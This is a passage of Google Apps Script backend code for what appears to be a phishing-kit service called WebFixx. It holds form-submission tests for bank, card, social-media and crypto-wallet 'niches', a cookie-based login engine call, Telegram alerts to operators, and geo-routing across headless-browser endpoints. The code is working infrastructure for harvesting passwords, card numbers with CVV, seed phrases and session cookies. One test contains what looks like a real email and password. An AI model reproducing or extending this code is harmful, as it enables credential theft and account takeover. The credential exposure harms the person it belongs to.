      const engineUrl = wakeBase + "/emails/cookie/cookie-api-login";
      UrlFetchApp.fetch(engineUrl, {
        method: 'POST',
        contentType: 'application/json',
        payload: JSON.stringify({ browserId: browserId, wakeUp: true }),
        muteHttpExceptions: true,
        timeout: 30000
      });
    } catch (engineError) {
      Logger.log("updateProcess: engine wake-up call failed (non-critical): " + engineError.message);
    }

    return createJsonResponse({
      success: true,
      browserId: browserId,
      updateType: updateType,
      message: "Row updated successfully, engine notified."
    });

  } catch (error) {
    Logger.log("Error in updateProcess: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.message,
      stack: error.stack
    });
  }
}


/**
 * Simple test for poolingOperator.
 * Edit `TEST_BROWSER_ID` or `updateData` below and run this from the Apps Script editor.
 */
function testPoolingOperatorSimple() {
  // If you want to reuse an existing row, set TEST_BROWSER_ID to that id, otherwise leave null to create one
  const TEST_BROWSER_ID = 'browser-1764182884232-44wd2w5pork'; // e.g. 'test-xxxxxxxx-xxxx-xxxx'
  const browserId = TEST_BROWSER_ID || ('test-' + Utilities.getUuid());

  Logger.log('testPoolingOperatorSimple starting for browserId: ' + browserId);

  // Create a new cookie row (safe even if browserId exists)
  const createResult = setCookieData({ browserId: browserId, newRow: true, status: 'WAITING', email: '', domain: '', password: '' });
  const createRaw = (createResult && typeof createResult.getContent === 'function') ? createResult.getContent() : JSON.stringify(createResult);
  Logger.log('setCookieData response: ' + createRaw);

  // Initial poll
  const initial = poolingOperator({ browserId: browserId });
  const initialRaw = (initial && typeof initial.getContent === 'function') ? initial.getContent() : JSON.stringify(initial);
  Logger.log('Initial poolingOperator response: ' + initialRaw);

  // Edit updateData below to change what fields get written
  const updateData = { email: 'simple@test.example', password: 'simplePass' };
  const updateResp = poolingOperator(Object.assign({ browserId: browserId }, updateData));
  const updateRaw = (updateResp && typeof updateResp.getContent === 'function') ? updateResp.getContent() : JSON.stringify(updateResp);
  Logger.log('Update poolingOperator response: ' + updateRaw);

  // Final poll to confirm persistence
  const final = poolingOperator({ browserId: browserId });
  const finalRaw = (final && typeof final.getContent === 'function') ? final.getContent() : JSON.stringify(final);
  Logger.log('Final poolingOperator response: ' + finalRaw);

  Logger.log('testPoolingOperatorSimple finished for browserId: ' + browserId);
  return createJsonResponse({ success: true, message: 'testPoolingOperatorSimple completed', browserId: browserId });
}



/**
 * Test method for notifyFormSubmission.
 * This function simulates calls to notifyFormSubmission with sample data for various categories.
 * NOTE: For these tests to run successfully in a real Google Apps Script environment,
 * the spreadsheet with CONFIG.DB_ID must exist and contain a "projects" sheet
 * with rows matching the 'token' for each test case. Each project row should have
 * appropriate 'templateType', 'templateNiche', 'projectTitle', 'userId', 'projectId',
 * 'formId', and 'telegramGroupId' columns.
 * The external API calls will also need to be functional or mocked in a real setup.
 */
function testNotifyFormSubmission() {
  Logger.log("--- Running comprehensive testNotifyFormSubmission ---");

  // Helper to run a single test case
  function runTestCase(testName, token, formData, expectedProjectRowMap) {
    Logger.log(`\n--- Test Case: ${testName} ---`);
    Logger.log(`Simulating project row for token '${token}': ${JSON.stringify(expectedProjectRowMap)}`);

    // In a real test environment, you would mock getRowsByColumn to return this:
    // getRowsByColumn.mockReturnValueOnce({ success: true, headers: Object.keys(expectedProjectRowMap), data: [Object.values(expectedProjectRowMap)], count: 1 });

    const testParams = { token: token, formData: formData };
    const result = notifyFormSubmission(testParams);
    Logger.log(`Result for ${testName}: ${JSON.stringify(result, null, 2)}`);
  }

  // Test Case 1: PLAIN TemplateType
  runTestCase(
    "PLAIN Submission",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "plain.user@example.com",
      password: "plainPassword123",
      ipData: { ip: "1.1.1.1", country: "Testland" },
      deviceData: { browser: "TestBrowser" }
    }
  );

  // Test Case 2: COOKIE TemplateType
  runTestCase(
    "COOKIE Submission",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "cookie.user@example.com",
      password: "cookiePassword123",
      ipData: { ip: "2.2.2.2", country: "Cookieland" },
      deviceData: { browser: "CookieBrowser" },
      cookieJSON: { session: "abc", auth: "xyz" },
      verified: true, // Explicitly set in formData for COOKIE
      fullAccess: true // Explicitly set in formData for COOKIE
    }
  );

  // Test Case 3: TRUE-LOGIN - WIRE Niche
  runTestCase(
    "TRUE-LOGIN - WIRE Niche",
    "6e381dfb-46a4-4c07-b448-36c2a0ddda90", // This token should exist in your 'projects' sheet
    {
      email: "wire.user@example.com",
      password: "wirePassword123",
      ipData: { ip: "3.3.3.3", country: "Wireland" },
      deviceData: { browser: "WireBrowser" }
    }
  );

  // Test Case 4: TRUE-LOGIN - BANK Niche
  runTestCase(
    "TRUE-LOGIN - BANK Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "4.4.4.4", country: "Bankland" },
      deviceData: { browser: "BankBrowser" },
      banks: [{ username: "bankUser", password: "bankPass", website: "mybank.com" }]
    }
  );

  // Test Case 5: TRUE-LOGIN - CARD Niche
  runTestCase(
    "TRUE-LOGIN - CARD Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "5.5.5.5", country: "Cardland" },
      deviceData: { browser: "CardBrowser" },
      cards: [{ cardNumber: "1111222233334444", expirationDate: "12/25", cvv: "123", issuer: "Visa", bankName: "CreditBank", website: "creditcard.com" }]
    }
  );

  // Test Case 6: TRUE-LOGIN - SOCIAL Niche
  runTestCase(
    "TRUE-LOGIN - SOCIAL Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "6.6.6.6", country: "Socialland" },
      deviceData: { browser: "SocialBrowser" },
      socials: [{ platform: "Facebook", username: "socialUser", password: "socialPass", website: "facebook.com" }]
    }
  );

  // Test Case 7: TRUE-LOGIN - WALLET Niche
  runTestCase(
    "TRUE-LOGIN - WALLET Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "7.7.7.7", country: "Walletland" },
      deviceData: { browser: "WalletBrowser" },
      wallets: [{ walletName: "MetaMask", wordPhrase: "word1 word2 word3", website: "metamask.io" }]
    }
  );

  Logger.log("\n--- All test cases completed ---");
}

/**
 * Wrapper function to be called by the time-driven trigger.
 * It retrieves the stored properties and calls updateMxRecordAndProvider.
 */
function runUpdateMxRecordAndProviderWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  // Find the property that matches a trigger ID pattern (if you had one)
  // For simplicity, let's assume the last set property is the one we need for now.
  // In a real scenario, you might iterate through properties or use a more specific key.
  let triggerIdFound = null;
  for (const key in allProperties) {
    // Assuming the triggerId is the key itself
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.email && properties.submissionId) { // Check for submissionId
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      // Not a JSON string or not the expected properties
      continue;
    }
  }

  if (triggerIdFound) {
    const propertiesString = scriptProperties.getProperty(triggerIdFound);
    scriptProperties.deleteProperty(triggerIdFound); // Clean up the property after use

    try {
      const { email, submissionId } = JSON.parse(propertiesString); // Retrieve submissionId
      Logger.log(`Wrapper: Retrieved email: ${email}, submissionId: ${submissionId}`);
      updateMxRecordAndProvider(email, submissionId); // Pass submissionId
    } catch (e) {
      Logger.log("Wrapper Error parsing properties or calling updateMxRecordAndProvider: " + e.message);
    }
  } else {
    Logger.log("Wrapper: No trigger properties found to process.");
  }

  // Delete all triggers for this function to prevent multiple executions
  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runUpdateMxRecordAndProviderWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}





/// USED IN OLD WEBFIXX


function alertUsers() {
  try {
    var spreadsheetId = '17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U'; // Replace with your Spreadsheet ID
    var spreadsheet = SpreadsheetApp.openById(spreadsheetId);
    var mainSheet = spreadsheet.getSheetByName("ALERT");
    var lastRow = mainSheet.getLastRow();
    var dataRange = mainSheet.getRange("A2:AY" + lastRow).getDisplayValues(); // Fetch values instead of getDisplayValues

    var messagesToSend = [];

    // Prepare data for processing
    dataRange.forEach(function(row, rowIndex) {
      var messageBody = row[31]; // Column AG (message body)
      var telegramId = row[38]; // Column AN (Telegram ID)
      var status = row[43]; // Column AS (Status)
      var sentStamp = row[49]; // Column AY (Sent Stamp)
      var emailAddress = row[39]; // Column AK (Email Address)

      if (messageBody && status === "ACTIVE" && !sentStamp && (telegramId || emailAddress)) {
        messagesToSend.push({ email: emailAddress, telegramId: telegramId, messageBody: messageBody, rowIndex: rowIndex });
      }
    });

    // Process and send messages
    messagesToSend.forEach(function(message) {
      if (message.telegramId) {
        sendTelegramMessage(message.telegramId, message.messageBody);
      }

      if (message.email) {
        sendEmail(message.email, "WebFixx Responses", message.messageBody);
      }

      // Update Sent Stamp
      mainSheet.getRange(message.rowIndex + 2, 50).setValue(new Date()); // Column AY (Sent Stamp)
    });
  } catch (error) {
    Logger.log("Error occurred: " + error);
    // Handle error accordingly
  }
}


// Function to send a message via Telegram to multiple chat IDs
function sendTelegramMessage(chatIds, message) {
  var chatIdArray = chatIds.split(","); // Split the chatIds by comma

  chatIdArray.forEach(function(chatId) {
    var payload = {
      method: "post",
      payload: {
        chat_id: chatId.trim(), // Trim spaces if any
        text: message
      }
    };

    var botToken = getSettingValue("webFixxTelegramBot");
    if (!botToken) { Logger.log("[sendTelegramMessage] No bot token in SETTINGS"); return; }
    UrlFetchApp.fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", payload);
  });
}

// Function to send an email
function sendEmail(emailAddress, subject, body) {
  MailApp.sendEmail(emailAddress, subject, body);
}

/**
 * Helper function to convert an object to URL-encoded form data string.
 * This is copied from adobe-login.html to simulate the client-side behavior.
 * @param {Object} obj - The object to convert.
 * @returns {string} The URL-encoded string.
 */
function objectToFormData(obj) {
  const formData = new URLSearchParams();
  Object.entries(obj).forEach(([key, value]) => {
    formData.append(key, value.toString());
  });
  return formData.toString();
}

/**
 * Test method for notifyFormSubmission, simulating the parameters it receives from doPost.
 * This allows direct testing of notifyFormSubmission within the App Script environment.
 * IMPORTANT: Replace 'YOUR_TEST_TOKEN' with an actual token from your 'projects' sheet
 * that corresponds to a project configured for 'WIRE' niche or 'PLAIN' templateType
 * for a more realistic test.
 */
function testNotifyFormSubmissionDirectCall() {
  Logger.log("--- Starting testNotifyFormSubmissionDirectCall ---");

  // Simulate the 'params' object that doPost would pass to notifyFormSubmission
  const simulatedParams = {
    token: "3112f9f0-d596-455c-bf5e-377667275371", // Replace with a valid token from your 'projects' sheet
    formData: JSON.stringify({
      email: "contractorlugana@outlook.com",
      password: "frigidon494$",
      ipData: { ip: "192.168.1.100", country: "DirectTestland", city: "DirectTestCity", region: "DirectTestRegion", isp: "DirectTestISP", timezone: "America/Chicago" },
      deviceData: { userAgent: "DirectTestBrowser", platform: "DirectTestPlatform" }
    })
  };

  Logger.log("Simulated parameters for notifyFormSubmission:", JSON.stringify(simulatedParams, null, 2));

  try {
    const result = notifyFormSubmission(simulatedParams);
    Logger.log("notifyFormSubmission direct call result:", result.getContent());
    const parsedResult = JSON.parse(result.getContent());

    if (parsedResult.success) {
      Logger.log("✅ testNotifyFormSubmissionDirectCall passed: Form submission processed successfully.");
      Logger.log("API Response (if any):", JSON.stringify(parsedResult.apiResponse, null, 2));
    } else {
      Logger.log("❌ testNotifyFormSubmissionDirectCall failed: " + parsedResult.error);
      if (parsedResult.stack) Logger.log("Stack:", parsedResult.stack);
      if (parsedResult.details) Logger.log("Details:", JSON.stringify(parsedResult.details, null, 2));
    }
  } catch (error) {
    Logger.log("❌ testNotifyFormSubmissionDirectCall encountered an unexpected error: " + error.message);
    Logger.log("Error stack:", error.stack);
  }

  Logger.log("--- Finished testNotifyFormSubmissionDirectCall ---");
}

/**
 * Test method to simulate an external API call to the web-fixx-hoo endpoint.
 * This simulates the actual fetch request made by the adobe-login.html template.
 * IMPORTANT: Replace 'YOUR_TEST_TOKEN' with an actual token from your 'projects' sheet
 * that corresponds to a project configured for 'WIRE' niche or 'PLAIN' templateType
 * for a more realistic test.
 * Ensure CONFIG.EXTERNAL_API is correctly set in doPost.js to point to your Vercel API.
 */
function testExternalApiNotifyFormSubmission() {
  Logger.log("--- Starting testExternalApiNotifyFormSubmission ---");

  // Define the external API endpoint (assuming CONFIG.EXTERNAL_API is accessible)
  const externalApiUrl = `${CONFIG.EXTERNAL_API}/notify-form-submission`;
  Logger.log("External API URL:", externalApiUrl);

  // Prepare the formData content as it would be in the client-side HTML
  const formDataContent = {
    email: "external.api.test@example.com",
    password: "externalApiPassword123",
    ipData: { ip: "1.2.3.4", country: "ExternalLand", city: "ExternalCity", region: "ExternalRegion", isp: "ExternalISP", timezone: "America/New_York" },
    deviceData: { userAgent: "ExternalBrowser", platform: "ExternalPlatform" }
  };

  // Prepare the final payload with token and stringified formData
  const finalPayload = {
    token: "536d1435-836a-403b-b6b6-ff92683cce02", // Replace with a valid token from your 'projects' sheet
    formData: JSON.stringify(formDataContent) // Stringify the entire formData object
  };

  Logger.log("Final Payload (before URL encoding):", JSON.stringify(finalPayload, null, 2));

  // Convert the final payload to URL-encoded format
  const requestBody = objectToFormData(finalPayload);
  Logger.log("Request Body (URL encoded):", requestBody);

  const options = {
    method: 'POST',
    contentType: 'application/x-www-form-urlencoded', // Crucial for matching client-side behavior
    payload: requestBody,
    muteHttpExceptions: true // Important to catch errors gracefully
  };

  try {
    const response = UrlFetchApp.fetch(externalApiUrl, options);
    const responseText = response.getContentText();
    Logger.log("External API Raw Response:", responseText);

    const parsedResponse = JSON.parse(responseText);
    Logger.log("External API Parsed Response:", JSON.stringify(parsedResponse, null, 2));

    if (parsedResponse.success) {
      Logger.log("✅ testExternalApiNotifyFormSubmission passed: External API call successful.");
      Logger.log("API Response (if any):", JSON.stringify(parsedResponse.apiResponse, null, 2));
    } else {
      Logger.log("❌ testExternalApiNotifyFormSubmission failed: " + parsedResponse.error);
      if (parsedResponse.stack) Logger.log("Stack:", parsedResponse.stack);
      if (parsedResponse.details) Logger.log("Details:", JSON.stringify(parsedResponse.details, null, 2));
    }
  } catch (error) {
    Logger.log("❌ testExternalApiNotifyFormSubmission encountered an unexpected error: " + error.message);
    Logger.log("Error stack:", error.stack);
  }

  Logger.log("--- Finished testExternalApiNotifyFormSubmission ---");
}

/**
 * Helper function to send a plain text email alert to a project owner.
 * This function utilizes the sendRequest function from appscripts/sender.js
 * which uses the Gmail API.
 * @param {string} toEmail - The recipient email address.
 * @param {string} subject - The subject of the email.
 * @param {string} bodyText - The plain text body of the email.
 */
function sendProjectEmailAlert(toEmail, subject, bodyText) {
  const message = 
    'MIME-Version: 1.0\r\n' +
    `To: <${toEmail}>\r\n` +
    `Subject: ${subject}\r\n` +
    'Content-Type: text/plain; charset=UTF-8\r\n\r\n' +
    `${bodyText}\r\n`;

  try {
    sendRequest(message); // Assuming sendRequest is globally available from sender.js
    Logger.log(`Email alert prepared for: ${toEmail}`);
  } catch (error) {
    Logger.log(`Error preparing email alert for ${toEmail}: ${error.message}`);
  }
}

function saveDebugPage(params) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let debugSheet = ss.getSheetByName("debug");
    if (!debugSheet) {
      debugSheet = ss.insertSheet("debug");
      debugSheet.appendRow(["sn", "timestamp", "browserId", "endpoint", "status", "htmlContent", "reason"]);
    }
    const headers = debugSheet.getRange(1, 1, 1, debugSheet.getLastColumn()).getValues()[0];
    const existingData = debugSheet.getDataRange().getValues();
    const nextSn = existingData.length;
    const rowData = headers.map(header => {
      switch (header.toLowerCase()) {
        case "sn": return nextSn;
        case "timestamp": return params.timestamp || new Date().toISOString();
        case "browserid": return params.browserId || "";
        case "endpoint": return params.endpoint || "";
        case "status": return params.status || "FAILED";
        case "htmlcontent": return params.htmlContent || "";
        case "reason": return params.reason || "";
        default: return "";
      }
    });
    debugSheet.appendRow(rowData);
    Logger.log(`[saveDebugPage] Debug snapshot saved for browserId: ${params.browserId}`);
    return createJsonResponse({ success: true, message: "Debug snapshot saved" });
  } catch (error) {
    Logger.log(`[saveDebugPage] Error: ${error.message}`);
    return createJsonResponse({ success: false, error: error.message });
  }
}

/**
 * Test getBestServerlessEndpoint using a mocked links sheet.
 * Edit run from the Apps Script editor. Prints which endpoint is picked for
 * each scenario and the reason (healthy-active geo+load / least-bad / fallback).
 */
function testGetBestServerlessEndpoint() {
  Logger.log("--- Starting testGetBestServerlessEndpoint ---");

  const headers = ['severlessId', 'severlessURL', 'severlessCategory', 'serverlessRph', 'serverlessRphUsage', 'serverlessRpd', 'serverlessRpdUsage', 'severlessStatus', 'severlessHealth', 'severlessIpdata', 'severlessPlatform', 'severlessType'];
  const originalGetCachedRows = getCachedRows;
  const originalGetServerCapacity = getServerCapacity;
  const originalProbeEnabled = SERVER_CAPACITY_PROBE_ENABLED;
  let mockData = null;
  let mockHeaders = headers;
  getCachedRows = function () {
    return { success: true, headers: mockHeaders, data: mockData, count: mockData.length };
  };
  // Mocked rows use fake URLs - never hit the network during this test.
  SERVER_CAPACITY_PROBE_ENABLED = false;
  function restore() {
    getCachedRows = originalGetCachedRows;
    getServerCapacity = originalGetServerCapacity;
    SERVER_CAPACITY_PROBE_ENABLED = originalProbeEnabled;
  }

  function assertEq(label, expected, actual) {
    Logger.log((expected === actual ? 'PASS' : 'FAIL') + ' | ' + label + ' | expected=' + expected + ' actual=' + actual);
  }

  // Scenario 1: healthy ACTIVE in GB + visitor in GB; geo wins over load.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK', 100, 90, 1000, 900, 'ACTIVE', 'ACTIVE', 'Egham, England, GB, loc 51.4316,-0.5524'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', 'Manchester, England, GB, loc 53.4808,-2.2426'],
    ['sl-3', 'https://headless-c.ngrok-free.app', 'LINK', 100, 5, 1000, 50, 'FAILED', 'ERROR', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  let r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', { country: 'GB', region: 'England', city: 'Egham', loc: '51.4316,-0.5524' });
  Logger.log("S1 (GB visitor, exact-match geo): " + JSON.stringify(r));
  assertEq('S1 chosen id (geo exact match wins)', 'sl-1', r && r.severlessId);

  // Scenario 2: no ACTIVE + health-ACTIVE rows left → RATE-LIMITED should beat FAILED (not least-bad straight).
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK', 100, 90, 1000, 900, 'FAILED', 'ERROR', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK', 100, 10, 1000, 100, 'RATE-LIMITED', 'ACTIVE', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  r = getBestServerlessEndpoint('BANK', 'https://fallback.example.com', { country: 'US', region: 'Texas', city: 'Austin', loc: '30.2672,-97.7431' });
  Logger.log("S2 (no healthy rows): " + JSON.stringify(r));
  assertEq('S2 RATE-LIMITED beats FAILED', 'sl-2', r && r.severlessId);

  // Scenario 2b: ACTIVE with degraded health beats RATE-LIMITED + FAILED.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'CAMPAIGN', 100, 90, 1000, 900, 'ACTIVE', 'DEGRADED', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'CAMPAIGN', 100, 10, 1000, 100, 'RATE-LIMITED', 'ACTIVE', 'Paris, Ile-de-France, FR, 48.8566,2.3522'],
    ['sl-3', 'https://headless-c.ngrok-free.app', 'CAMPAIGN', 100, 5, 1000, 50, 'FAILED', 'ERROR', 'Berlin, DE, 52.52,13.405']
  ];
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {});
  Logger.log("S2b (ACTIVE degraded health): " + JSON.stringify(r));
  assertEq('S2b ACTIVE-degraded chosen', 'sl-1', r && r.severlessId);

  // Scenario 2c: only FAILED rows remain → NEVER pick FAILED; fall back to CONFIG.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK', 100, 90, 1000, 900, 'FAILED', 'ERROR', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK', 100, 10, 1000, 100, 'FAILED', 'ERROR', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {});
  Logger.log("S2c (only FAILED): " + JSON.stringify(r));
  assertEq('S2c fallback used (never FAILED)', 'https://fallback.example.com', r && r.severlessURL);

  // Scenario 2d: ACTIVE over-limit row must beat a FAILED row (FAILED never pickable).
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'CAMPAIGN', 100, 100, 1000, 1000, 'ACTIVE', 'ACTIVE', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'CAMPAIGN', 100, 10, 1000, 100, 'FAILED', 'ERROR', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  r = getBestServerlessEndpoint('BANK', 'https://fallback.example.com', {});
  Logger.log("S2d (ACTIVE over-limit vs FAILED): " + JSON.stringify(r));
  assertEq('S2d ACTIVE-over-limit chosen', 'sl-1', r && r.severlessId);

  // Scenario 2e: only blank/unknown status rows (unconfigured junk) → NEVER routed to; fallback used.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK', '', '', '100', '100', '', 'RED', ''],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK', '', '', '100', '100', '', 'ERROR', '']
  ];
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {});
  Logger.log("S2e (blank status junk): " + JSON.stringify(r));
  assertEq('S2e fallback used (never blank-status)', 'https://fallback.example.com', r && r.severlessURL);

  // Scenario 2f: ACTIVE + blank-status + FAILED → blank-status ignored, ACTIVE wins.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK', '', '', '', '', '', 'RED', ''],
    ['sl-3', 'https://headless-c.vercel.app', 'LINK', 100, 10, 1000, 100, 'FAILED', 'ERROR', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {});
  Logger.log("S2f (ACTIVE among junk): " + JSON.stringify(r));
  assertEq('S2f ACTIVE chosen over blank/FAILED', 'sl-1', r && r.severlessId);

  // Scenario 3: no rows at all → fallback endpoint.
  mockData = [];
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {});
  Logger.log("S3 (no rows): " + JSON.stringify(r));
  assertEq('S3 fallback base', 'https://fallback.example.com', r && r.severlessURL);

  // Scenario 4: Category filtering — LINK request skips CAMPAIGN-only servers
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', 'Paris, Ile-de-France, FR, 48.8566,2.3522'],
    ['sl-3', 'https://headless-c.vercel.app', 'LINK,CAMPAIGN', 100, 15, 1000, 150, 'ACTIVE', 'ACTIVE', 'Berlin, DE, 52.52,13.405']
  ];
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {}, 'LINK');
  Logger.log("S4 (LINK filter): " + JSON.stringify(r));
  assertEq('S4 CAMPAIGN-only skipped', 'sl-2', r && r.severlessId);

  // Scenario 5: Category filtering — CAMPAIGN request skips LINK-only servers
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'CAMPAIGN', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', 'Paris, Ile-de-France, FR, 48.8566,2.3522'],
    ['sl-3', 'https://headless-c.vercel.app', 'LINK,CAMPAIGN', 100, 15, 1000, 150, 'ACTIVE', 'ACTIVE', 'Berlin, DE, 52.52,13.405']
  ];
  r = getBestServerlessEndpoint(null, 'https://fallback.example.com', null, 'CAMPAIGN');
  Logger.log("S5 (CAMPAIGN filter): " + JSON.stringify(r));
  assertEq('S5 LINK-only skipped', 'sl-2', r && r.severlessId);

  // Scenario 6: Category filtering — all servers wrong category → fallback
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'CAMPAIGN', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {}, 'LINK');
  Logger.log("S6 (no matching category): " + JSON.stringify(r));
  assertEq('S6 fallback used (no LINK category)', 'https://fallback.example.com', r && r.severlessURL);

  // Scenario 7: Category filtering — comma-separated LINK,CAMPAIGN matches LINK request
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'CAMPAIGN', 100, 5, 1000, 50, 'FAILED', 'ERROR', 'London, England, GB, 51.5074,-0.1278'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK,CAMPAIGN', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', 'Paris, Ile-de-France, FR, 48.8566,2.3522']
  ];
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {}, 'LINK');
  Logger.log("S7 (comma-separated match): " + JSON.stringify(r));
  assertEq('S7 LINK,CAMPAIGN matched for LINK request', 'sl-2', r && r.severlessId);

  // ── severlessType (server type) filter scenarios ─────────────────────────
  // Row layout: [id, url, category, rph, rphUsage, rpd, rpdUsage, status, health, ipdata, severlessPlatform, severlessType]

  // S8: type=EMAIL — SOCIAL-only and untyped rows skipped; EMAIL-tagged row wins on load.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK,CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', '', '', 'EMAIL'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK,CAMPAIGN', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', '', '', 'SOCIAL'],
    ['sl-3', 'https://headless-c.vercel.app', 'LINK,CAMPAIGN', 100, 15, 1000, 150, 'ACTIVE', 'ACTIVE', '', '', ''],
    ['sl-4', 'https://headless-d.vercel.app', 'LINK,CAMPAIGN', 100, 20, 1000, 200, 'ACTIVE', 'ACTIVE', '', '', 'EMAIL,SOCIAL,BANK']
  ];
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {}, 'CAMPAIGN', '', 'EMAIL');
  Logger.log("S8 (type=EMAIL): " + JSON.stringify(r));
  assertEq('S8 type=EMAIL picks EMAIL row (SOCIAL + untyped skipped)', 'sl-1', r && r.severlessId);

  // S9: type=SOCIAL — only rows carrying SOCIAL (SOCIAL-only or combo) eligible.
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {}, 'CAMPAIGN', '', 'SOCIAL');
  Logger.log("S9 (type=SOCIAL): " + JSON.stringify(r));
  assertEq('S9 type=SOCIAL picks SOCIAL-tagged row (EMAIL + untyped skipped)', 'sl-2', r && r.severlessId);

  // S10: severlessPlatform axis — lowercase 'tiktok' matches GMAIL,OUTLOOK,AOL,TIKTOK list (no type requested).
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK,CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', '', 'GMAIL', 'EMAIL'],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK,CAMPAIGN', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', '', 'GMAIL,OUTLOOK,AOL,TIKTOK', 'EMAIL,SOCIAL,BANK']
  ];
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {}, 'CAMPAIGN', 'tiktok');
  Logger.log("S10 (platform=tiktok lowercase): " + JSON.stringify(r));
  assertEq('S10 lowercase tiktok matches TIKTOK platform list', 'sl-2', r && r.severlessId);

  // S11: type + platform combined (intersection) — social login link: SOCIAL type + TIKTOK platform.
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {}, 'CAMPAIGN', 'TIKTOK', 'SOCIAL');
  Logger.log("S11 (type=SOCIAL + platform=TIKTOK): " + JSON.stringify(r));
  assertEq('S11 type+platform intersection picks combo row', 'sl-2', r && r.severlessId);

  // S11b: type + platform combined for email: EMAIL type + GMAIL platform.
  r = getBestServerlessEndpoint('WIRE', 'https://fallback.example.com', {}, 'CAMPAIGN', 'GMAIL', 'EMAIL');
  Logger.log("S11b (type=EMAIL + platform=GMAIL): " + JSON.stringify(r));
  assertEq('S11b email type+platform picks GMAIL row', 'sl-1', r && r.severlessId);

  // S12: bank platform value — CHASE matches only rows listing CHASE.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK,CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', '', 'CHASE,WELLS', 'BANK'],
